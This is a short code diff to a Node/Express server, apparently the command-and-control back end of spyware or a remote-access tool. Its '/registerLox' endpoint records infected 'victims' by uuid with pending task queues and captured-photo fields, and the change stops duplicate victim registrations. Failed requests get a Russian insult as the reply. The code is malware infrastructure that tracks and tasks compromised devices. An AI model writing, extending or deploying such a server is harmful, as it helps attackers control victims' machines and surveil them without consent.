@@ -42,8 +42,11 @@ const selfIp = getPublicIpAddress()
 app.post('/registerLox', async (req,res) => {
   console.log(req.body)
   if (req && req.body && req.body.uuid) {
-    victims.push({uuid: req.body.uuid, pendingTasks: [], currentPhoto: 'none', photoId: 0})
-    console.log(req.body.uuid)
+    const victim = victims.find(potentialVictim => potentialVictim.uuid === req.body.uuid)
+    if (!victim) {
+      victims.push({uuid: req.body.uuid, pendingTasks: [], currentPhoto: 'none', photoId: 0})
+      console.log(req.body.uuid)
+    }
     safeJson(res,req,{'ok': true, 'msg': 'a'}, 200)
   } else {
     safeJson(res,req,{'ok': false, 'msg': 'Твоя мать 200'}, 200)
